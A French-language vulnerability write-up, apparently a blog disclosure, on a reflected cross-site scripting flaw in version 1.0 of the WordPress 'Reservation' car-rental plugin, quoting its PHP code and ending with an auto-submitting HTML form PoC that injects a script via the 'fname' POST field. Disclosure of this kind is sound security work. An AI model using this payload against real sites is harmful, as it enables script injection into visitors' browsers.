---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Reservation"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Reservation](https://wordpress.org/plugins/reservation/) se présente de cette façon :

> Navotar Car Rental Reservation Plugin can be easily plugged into your website.
>
> Add the Car Rental Reservation Plugin directly into your website and start getting online reservation from your customers.
>
> Your customers can simply visit your website and select the vehicle they need and fill in the required information and submit. The reservation made will be sent to your car rental software account with Navotar right away.

D'autres fonctionnalités sont listées sur la page du plugin.

La version testée est la 1.0 et date d'il y a 4 ans au moment de ces lignes.

## La vulnérabilité

Dans le script principal `reservation.php` une classe `NTRA_MainControllerOfNavotar` est définie et instanciée en fin de script.

Cette classe a un constructeur qui hooke différentes fonctions :

```php
 Class NTRA_MainControllerOfNavotar{

    public function __construct(){

        add_action( 'init',array( &$this, 'NTRAfileInclude' ) );
        add_action ( 'wp_head',array(&$this, 'NTRAhookInHeader' ));
        add_action( 'init',array( &$this, 'NTRAfrontendFiles' ) );
        add_action( 'admin_menu', array( &$this, 'NTRAaddAdminMenu' ) );
        add_action( 'wp_enqueue_scripts', array( &$this, 'NTRAaddFrontendScripts' ) );
        add_action( 'admin_init',array( &$this, 'NTRAloadAdminStyle' ) );
        add_filter( 'template_include',array( &$this, 'NTRAcontactPageTemplate') );
        add_action('admin_enqueue_scripts', array( &$this, 'NTRAcstmCssAndJs'));
        add_action('admin_enqueue_scripts', array( &$this, 'NTRAadminUrl'));
        add_action("wp_head", array( &$this,"NTRAmyPrintCustomStyle"));
        register_activation_hook(__FILE__,array(&$this, 'NTRAcustomPages'));
```

Le hook destiné aux templates inclus le template nommé `summary.php` :

```php
    function NTRAcontactPageTemplate( $template ) {
        if ( is_page( 'listing' ) ) {
            if ( locate_template( 'listing.php' ) ) {
                $template = locate_template( 'listing.php' );
            } else {
                $template = dirname( __FILE__ ) .'/templates/' . 'listing.php';
            }
        }
--- snip ---                                                                                                                       
        if ( is_page( 'summary' ) ) {
            if ( locate_template( 'summary.php' ) ) {
                $template = locate_template( 'summary.php' );
            } else {
                $template = dirname( __FILE__ ) .'/templates/' . 'summary.php';
            }
        }
--- snip ---
```

C'est ce dernier template qui est vulnérable.

Il commence par extraire les données du tableau `$_POST` pour en remplir d'autres :

```php
    $inf = array();
    $arr = $_POST;

    foreach ($arr as $key => $value) {
        if(stripos($key, '-') !== false){
            $val =  explode("-", $key);
            array_push($val, $value);
            array_push($inf, $val);
        }
        else{
            $exp =  explode("-", $value);
            array_push($inf, $exp);
        }
    }
```

En l'occurrence, c'est dans le bloc `else` que les valeurs passées par POST sont placées dans le tableau `$inf`.

Plus tard le script affiche les données qui n'ont pas été préalablement échappées donc possibilité de XSS :

```php
    //check prmocode onload end

    $("#checkpromo").blur(function(){
        var promo = $('#checkpromo').val();
        if(promo !=''){
            var vtid = <?php if(!empty($inf[0][0])){ echo $inf[0][0]; }  ?>;
            var lid = <?php if(!empty($inf[0][1])){ echo $inf[0][1]; }  ?>;
```

L'injection se fait au milieu de code Javascript. On peut simplement fermer la balise `script` courante puis en rouvrir une autre.

PoC :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/?page_id=8">
        <input type="hidden" name="fname" value="&lt;/script&gt;&lt;ScRiPt&gt;alert(/XSS/)&lt;/sCrIpT&gt;" />
        <input type="hidden" name="lname" value="default" />
        <input type="hidden" name="phone" value="default" />
        <input type="hidden" name="email" value="whatever@nowhere.com" />
        <input type="hidden" name="city" value="default" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```
